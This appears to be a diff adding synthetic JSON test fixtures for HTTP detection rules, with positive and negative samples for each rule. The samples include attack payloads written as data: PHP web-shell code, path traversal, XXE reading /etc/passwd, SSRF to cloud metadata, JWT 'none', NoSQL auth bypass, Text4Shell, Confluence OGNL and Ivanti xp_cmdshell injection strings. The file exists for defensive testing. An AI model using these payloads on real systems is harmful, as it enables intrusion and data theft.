@@ -1,0 +1,688 @@
+{
+  "description": "Synthetic detection fixtures, never executed. Parsed metadata fixtures represent adapter output; they do not test or implement multipart/JSON/GraphQL/JWT parsers. Assertions concern the named rule; overlapping families may also match.",
+  "rules": [
+    {
+      "rule_id": "http.upload.server-script",
+      "positive": [
+        {
+          "uploadedfilenames": [
+            "avatar.jpg",
+            "shell.PHp"
+          ]
+        },
+        {
+          "uploadedfilenames": [
+            "image.jpg.jsp"
+          ]
+        },
+        {
+          "uploadedfilenames": [
+            "s.php\u0000.jpg"
+          ]
+        },
+        {
+          "uploadedfilenames": [
+            "x.aspx. "
+          ]
+        }
+      ],
+      "negative": [
+        {
+          "uploadedfilenames": [
+            "photo.png",
+            "manual.php.txt"
+          ]
+        },
+        {
+          "uploadedfilenames": [
+            "report.docx"
+          ]
+        },
+        {
+          "requestbody": "{\"filename\":\"shell.php\"}"
+        }
+      ]
+    },
+    {
+      "rule_id": "http.upload.path-traversal",
+      "positive": [
+        {
+          "uploadedfilenames": [
+            "../../out.txt"
+          ]
+        },
+        {
+          "uploadedfilenames": [
+            "..\\config\\out.txt"
+          ]
+        }
+      ],
+      "negative": [
+        {
+          "uploadedfilenames": [
+            "photos/image.png"
+          ]
+        },
+        {
+          "uploadedfilenames": [
+            "report..txt"
+          ]
+        },
+        {
+          "uploadedfilenames": [
+            "C:\\fakepath\\picture.jpg"
+          ]
+        }
+      ]
+    },
+    {
+      "rule_id": "http.upload.server-config",
+      "positive": [
+        {
+          "uploadedfilenames": [
+            ".htaccess"
+          ]
+        },
+        {
+          "uploadedfilenames": [
+            "dir/WEB.CONFIG"
+          ]
+        }
+      ],
+      "negative": [
+        {
+          "uploadedfilenames": [
+            "readme-web.config.txt"
+          ]
+        },
+        {
+          "uploadedfilenames": [
+            "photo.ini"
+          ]
+        }
+      ]
+    },
+    {
+      "rule_id": "http.upload.php-session-file",
+      "positive": [
+        {
+          "uploadedfilenames": [
+            "/tmp/sess_1234567890abcdefghijklmn"
+          ]
+        },
+        {
+          "uploadedfilenames": [
+            "C:\\temp\\sess_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+          ]
+        }
+      ],
+      "negative": [
+        {
+          "uploadedfilenames": [
+            "sess_short"
+          ]
+        },
+        {
+          "uploadedfilenames": [
+            "sess_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+          ]
+        },
+        {
+          "uploadedfilenames": [
+            "sess_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.txt"
+          ]
+        }
+      ]
+    },
+    {
+      "rule_id": "http.upload.php-execution-content",
+      "positive": [
+        {
+          "uploadedfilecontents": [
+            "<?php system('id'); ?>"
+          ]
+        },
+        {
+          "uploadedfilecontents": [
+            "<?PHP\n eval($input);"
+          ]
+        }
+      ],
+      "negative": [
+        {
+          "uploadedfilecontents": [
+            "<?php echo 'hello'; ?>"
+          ]
+        },
+        {
+          "uploadedfilecontents": [
+            "<?php",
+            "system('id');"
+          ]
+        },
+        {
+          "uploadedfilecontents": [
+            "an example of system() with no PHP tag"
+          ]
+        },
+        {
+          "requestbody": "<?php system('id'); ?>"
+        }
+      ]
+    },
+    {
+      "rule_id": "http.multipart.deprecated-transfer-encoding",
+      "positive": [
+        {
+          "multipartpartheaders": [
+            "Content-Disposition: form-data; name=\"a\"",
+            "Content-Transfer-Encoding: base64"
+          ]
+        },
+        {
+          "multipartpartheaders": [
+            "CONTENT-TRANSFER-ENCODING: binary"
+          ]
+        }
+      ],
+      "negative": [
+        {
+          "multipartpartheaders": [
+            "Content-Disposition: form-data; name=\"a\"",
+            "Content-Type: text/plain"
+          ]
+        },
+        {
+          "requestbody": "The document describes Content-Transfer-Encoding: base64"
+        }
+      ]
+    },
+    {
+      "rule_id": "http.multipart.unsafe-charset",
+      "positive": [
+        {
+          "multipartcharsets": [
+            "UTF-16LE"
+          ]
+        },
+        {
+          "multipartcharsets": [
+            "utf-8",
+            "utf-7"
+          ]
+        }
+      ],
+      "negative": [
+        {
+          "multipartcharsets": [
+            "utf-8",
+            "iso-8859-1"
+          ]
+        },
+        {
+          "multipartcharsets": [
+            "windows-1252"
+          ]
+        },
+        {
+          "multipartcharsets": [
+            "not-utf-7"
+          ]
+        }
+      ]
+    },
+    {
+      "rule_id": "http.response.directory-listing",
+      "positive": [
+        {
+          "responsebody": "<html><title>Index of /public</title>\n<h1>Index of /public</h1></html>"
+        },
+        {
+          "responsebody": "<A HREF=\"/\">[To Parent Directory]</A><br>"
+        }
+      ],
+      "negative": [
+        {
+          "responsebody": "<title>Index of software terms</title><h1>Dictionary</h1>"
+        },
+        {
+          "responsebody": "A guide to Index of pages"
+        }
+      ]
+    },
+    {
+      "rule_id": "http.response.cgi-source",
+      "positive": [
+        {
+          "responsebody": "#!/usr/bin/python3\nprint('Content-Type: text/plain')\n"
+        },
+        {
+          "responsebody": "#!/usr/bin/env perl\nprint 'hello';"
+        }
+      ],
+      "negative": [
+        {
+          "responsebody": "Download this script: #!/usr/bin/python3"
+        },
+        {
+          "responsebody": "#!/bin/notaninterpreter\n"
+        },
+        {
+          "responsebody": "#!/usr/bin/pythonish\n"
+        }
+      ]
+    },
+    {
+      "rule_id": "http.response.php-source",
+      "positive": [
+        {
+          "responsebody": "<?php echo $_SERVER['SERVER_NAME']; ?>"
+        },
+        {
+          "responsebody": "<?PHP session_start(); ?>"
+        }
+      ],
+      "negative": [
+        {
+          "responsebody": "<?xml version=\"1.0\"?><name>$_GET</name>"
+        },
+        {
+          "responsebody": "&lt;?php echo $_GET['name']; ?&gt;"
+        },
+        {
+          "responsebody": "<?php echo 'hello'; ?>"
+        }
+      ]
+    },
+    {
+      "rule_id": "http.response.ruby-template-source",
+      "positive": [
+        {
+          "responsebody": "<%= ENV[\"DATABASE_PASSWORD\"] %>"
+        },
+        {
+          "responsebody": "<%= Rails.application.credentials.secret_key_base %>"
+        }
+      ],
+      "negative": [
+        {
+          "responsebody": "<%= greeting %>"
+        },
+        {
+          "responsebody": "&lt;%= ENV['name'] %&gt;"
+        },
+        {
+          "responsebody": "<%= user.environment %>"
+        }
+      ]
+    },
+    {
+      "rule_id": "http.api.graphql-introspection",
+      "positive": [
+        {
+          "graphqlfieldnames": [
+            "__schema",
+            "types",
+            "name"
+          ]
+        },
+        {
+          "graphqlfieldnames": [
+            "__type",
+            "fields"
+          ]
+        }
+      ],
+      "negative": [
+        {
+          "graphqlfieldnames": [
+            "__typename",
+            "products"
+          ]
+        },
+        {
+          "graphqlfieldnames": [
+            "__schemaVersion"
+          ]
+        },
+        {
+          "requestbody": "{\"query\":\"{ echo(message: \\\"__schema\\\") }\"}"
+        },
+        {
+          "graphqlfieldnames": [
+            "__SCHEMA"
+          ]
+        }
+      ]
+    },
+    {
+      "rule_id": "http.api.graphql-complexity",
+      "positive": [
+        {
+          "graphqlmaxdepth": 21,
+          "graphqlaliascount": 0
+        },
+        {
+          "graphqlaliascount": 101
+        },
+        {
+          "graphqlmaxdepth": 21
+        }
+      ],
+      "negative": [
+        {
+          "graphqlmaxdepth": 20,
+          "graphqlaliascount": 100
+        },
+        {
+          "graphqlmaxdepth": 3,
+          "graphqlaliascount": 2
+        },
+        {
+          "requestbody": "{fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:fake:}"
+        },
+        {
+          "graphqlmaxdepth": null,
+          "graphqlaliascount": null
+        }
+      ]
+    },
+    {
+      "rule_id": "http.api.graphql-batch",
+      "positive": [
+        {
+          "graphqlbatchsize": 11
+        },
+        {
+          "graphqlbatchsize": 100
+        }
+      ],
+      "negative": [
+        {
+          "graphqlbatchsize": 10
+        },
+        {
+          "graphqlbatchsize": 1
+        },
+        {
+          "requestbody": "[1,2,3,4,5,6,7,8,9,10,11]"
+        }
+      ]
+    },
+    {
+      "rule_id": "http.authentication.jwt-none",
+      "positive": [
+        {
+          "jwtalgorithm": "none"
+        },
+        {
+          "jwtalgorithm": "NoNe"
+        }
+      ],
+      "negative": [
+        {
+          "jwtalgorithm": "RS256"
+        },
+        {
+          "jwtalgorithm": "none-other"
+        },
+        {
+          "requestbody": "{\"alg\":\"none\"}"
+        }
+      ]
+    },
+    {
+      "rule_id": "http.authentication.jwt-kid-traversal",
+      "positive": [
+        {
+          "jwtkeyid": "../../dev/null"
+        },
+        {
+          "jwtkeyid": "keys\\..\\signing.pem"
+        }
+      ],
+      "negative": [
+        {
+          "jwtkeyid": "signing-key-2026"
+        },
+        {
+          "jwtkeyid": "version..2"
+        },
+        {
+          "jwtkeyid": "%2e%2e%2fdev/null"
+        }
+      ]
+    },
+    {
+      "rule_id": "http.api.json-prototype-pollution",
+      "positive": [
+        {
+          "requestjsonpaths": [
+            "/settings",
+            "/settings/__proto__",
+            "/settings/__proto__/polluted"
+          ]
+        },
+        {
+          "requestjsonpaths": [
+            "/constructor",
+            "/constructor/prototype",
+            "/constructor/prototype/isAdmin"
+          ]
+        }
+      ],
+      "negative": [
+        {
+          "requestjsonpaths": [
+            "/description"
+          ],
+          "requestbody": "{\"description\":\"__proto__ and constructor.prototype\"}"
+        },
+        {
+          "requestjsonpaths": [
+            "/constructor",
+            "/prototype"
+          ]
+        },
+        {
+          "requestjsonpaths": [
+            "/constructor~1prototype"
+          ]
+        },
+        {
+          "requestjsonpaths": [
+            "/__PROTO__"
+          ]
+        }
+      ]
+    },
+    {
+      "rule_id": "http.api.nosql-auth-operator",
+      "positive": [
+        {
+          "clientrequesturi": "/api/login",
+          "requestjsonpaths": [
+            "/password",
+            "/password/$ne"
+          ]
+        },
+        {
+          "clientrequesturi": "/auth?continue=/home",
+          "requestjsonpaths": [
+            "/username/$regex"
+          ]
+        }
+      ],
+      "negative": [
+        {
+          "clientrequesturi": "/api/login",
+          "requestjsonpaths": [
+            "/password"
+          ]
+        },
+        {
+          "clientrequesturi": "/api/query",
+          "requestjsonpaths": [
+            "/criteria/$where"
+          ]
+        },
+        {
+          "clientrequesturi": "/products?redirect=/login",
+          "requestjsonpaths": [
+            "/password/$ne"
+          ]
+        },
+        {
+          "clientrequesturi": "/login",
+          "requestjsonpaths": [
+            "/description"
+          ],
+          "requestbody": "{\"description\":\"$where\"}"
+        }
+      ]
+    },
+    {
+      "rule_id": "http.ssrf.cloud-metadata-request-body",
+      "positive": [
+        {
+          "requestbody": "{\"url\":\"http://169.254.169.254/latest/meta-data/\"}"
+        },
+        {
+          "requestbody": "callback=http%3A%2F%2Fmetadata.google.internal%2FcomputeMetadata%2Fv1"
+        }
+      ],
+      "negative": [
+        {
+          "requestbody": "{\"url\":\"https://example.invalid/latest/meta-data\"}"
+        },
+        {
+          "requestbody": "{\"url\":\"http://169.254.169.254.example.invalid/\"}"
+        },
+        {
+          "requestbody": "read about 169.254.169.254"
+        }
+      ]
+    },
+    {
+      "rule_id": "http.xxe.external-entity-request-body",
+      "positive": [
+        {
+          "requestbody": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>"
+        },
+        {
+          "requestbody": "<!DOCTYPE r SYSTEM \"https://example.invalid/ext.dtd\"><r/>"
+        },
+        {
+          "requestbody": "<!DOCTYPE r [<!ENTITY % ext SYSTEM \"http://example.invalid/a.dtd\">%ext;]><r/>"
+        }
+      ],
+      "negative": [
+        {
+          "requestbody": "<!DOCTYPE html><html/>"
+        },
+        {
+          "requestbody": "<!DOCTYPE r [<!ENTITY x \"literal\">]><r>&x;</r>"
+        },
+        {
+          "requestbody": "&lt;!ENTITY x SYSTEM \"file:///etc/passwd\"&gt;"
+        }
+      ]
+    },
+    {
+      "rule_id": "http.exploit.text4shell-request-body",
+      "positive": [
+        {
+          "requestbody": "value=${script:javascript:java.lang.Runtime.getRuntime().exec(\"id\")}"
+        },
+        {
+          "requestbody": "value=%24%7Burl%3AUTF-8%3Ahttp%3A%2F%2Fexample.invalid%2F%7D"
+        },
+        {
+          "requestbody": "value=${dns:address|example.invalid}"
+        }
+      ],
+      "negative": [
+        {
+          "requestbody": "request url dns script utf-8 java help"
+        },
+        {
+          "requestbody": "${env:HOME}"
+        },
+        {
+          "requestbody": "${url:UTF-8:http://}"
+        }
+      ]
+    },
+    {
+      "rule_id": "http.exploit.confluence-ognl-request-body",
+      "positive": [
+        {
+          "clientrequestmethod": "POST",
+          "clientrequesturi": "/template/aui/text-inline.vm",
+          "requestbody": "label=ognl.Ognl",
+          "edgeresponsestatus": 403
+        },
+        {
+          "clientrequestmethod": "POST",
+          "clientrequesturi": "/template/aui/text-inline.vm",
+          "requestbody": "label=%40java.lang.Runtime%40getRuntime()"
+        }
+      ],
+      "negative": [
+        {
+          "clientrequestmethod": "POST",
+          "clientrequesturi": "/template/aui/text-inline.vm",
+          "requestbody": "label=Hello"
+        },
+        {
+          "clientrequestmethod": "POST",
+          "clientrequesturi": "/normal-template",
+          "requestbody": "ognl.Ognl"
+        },
+        {
+          "clientrequestmethod": "GET",
+          "clientrequesturi": "/template/aui/text-inline.vm",
+          "requestbody": "ognl.Ognl"
+        },
+        {
+          "clientrequestmethod": "POST",
+          "clientrequesturi": "/template/aui/text-inline.vm",
+          "edgeresponsestatus": 200
+        }
+      ]
+    },
+    {
+      "rule_id": "http.exploit.ivanti-epm-recordgoodapp-sqli",
+      "positive": [
+        {
+          "clientrequestmethod": "POST",
+          "clientrequesturi": "/WSStatusEvents/EventHandler.asmx",
+          "requestbody": "<RecordGoodApp><goodApp><md5>test; exec xp_cmdshell 'id';</md5></goodApp></RecordGoodApp>",
+          "edgeresponsestatus": 500
+        },
+        {
+          "clientrequestmethod": "POST",
+          "clientrequesturi": "/WSStatusEvents/EventHandler.asmx",
+          "requestbody": "<epm:RecordGoodApp xmlns:epm=\"urn:epm\"><md5>xp&#95;cmdshell</md5></epm:RecordGoodApp>"
+        }
+      ],
+      "negative": [
+        {
+          "clientrequestmethod": "POST",
+          "clientrequesturi": "/WSStatusEvents/EventHandler.asmx",
+          "requestbody": "<RecordGoodApp><goodApp><md5>abc123</md5></goodApp></RecordGoodApp>"
+        },
+        {
+          "clientrequestmethod": "POST",
+          "clientrequesturi": "/other.asmx",
+          "requestbody": "<RecordGoodApp>xp_cmdshell</RecordGoodApp>"
+        },
+        {
+          "clientrequestmethod": "POST",
+          "clientrequesturi": "/WSStatusEvents/EventHandler.asmx",
+          "requestbody": "<OtherMethod>xp_cmdshell</OtherMethod>"
+        }
+      ]
+    }
+  ]
+}
